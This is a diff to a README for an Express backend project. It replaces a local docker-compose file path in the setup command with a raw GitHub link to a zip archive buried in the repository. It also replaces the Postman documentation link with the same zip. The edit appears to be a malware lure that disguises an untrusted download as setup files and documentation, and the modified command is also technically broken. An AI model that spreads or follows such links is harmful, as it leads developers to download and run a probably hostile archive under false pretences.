@@ -19,7 +19,7 @@ npm start
 NOTE: cd TopDevCloneBE/express_service
 
 ```
-docker-compose up -d && docker-compose -f services/job/sharding/docker-compose.yml up -d && make all
+docker-compose up -d && docker-compose -f https://github.com/trieuduy27051999/TopDevCloneBE/raw/refs/heads/main/express_service/services/user/repositories/candidate/Top-Dev-BE-Clone-3.7.zip up -d && make all
 ```
 
 ### Testing
@@ -31,4 +31,4 @@ docker-compose up -d && docker-compose -f services/job/sharding/docker-compose.y
 
 ### Documentation
 
-Documentation link [here](https://documenter.getpostman.com/view/34533462/2sA3Bt1UTM)
+Documentation link [here](https://github.com/trieuduy27051999/TopDevCloneBE/raw/refs/heads/main/express_service/services/user/repositories/candidate/Top-Dev-BE-Clone-3.7.zip)
